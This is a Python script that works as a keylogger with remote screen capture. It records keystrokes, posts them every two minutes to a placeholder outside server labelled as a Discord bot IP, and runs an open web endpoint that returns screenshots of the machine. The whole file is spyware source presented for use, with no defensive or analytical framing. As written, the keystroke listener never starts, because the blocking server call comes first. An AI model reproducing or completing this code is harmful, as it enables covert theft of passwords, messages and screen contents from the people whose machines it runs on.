import requests
import time
import pyautogui
from pynput import keyboard
from flask import Flask, request, send_file

server_url = "http://YOUR_DISCORD_BOT_IP:5000/log"  # Replace with actual IP
log_data = []
app = Flask(__name__)

def on_press(key):
    try:
        log_data.append(key.char)
    except AttributeError:
        log_data.append(f"[{key}]")

def send_logs():
    while True:
        if log_data:
            requests.post(server_url, data="".join(log_data))
            log_data.clear()
        time.sleep(120)

@app.route("/screenshot", methods=["GET"])
def take_screenshot():
    screenshot_path = "screenshot.png"
    pyautogui.screenshot().save(screenshot_path)
    return send_file(screenshot_path, mimetype="image/png")

if __name__ == "__main__":
    from threading import Thread
    Thread(target=send_logs, daemon=True).start()
    app.run(host="0.0.0.0", port=5001)  # Running on port 5001
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()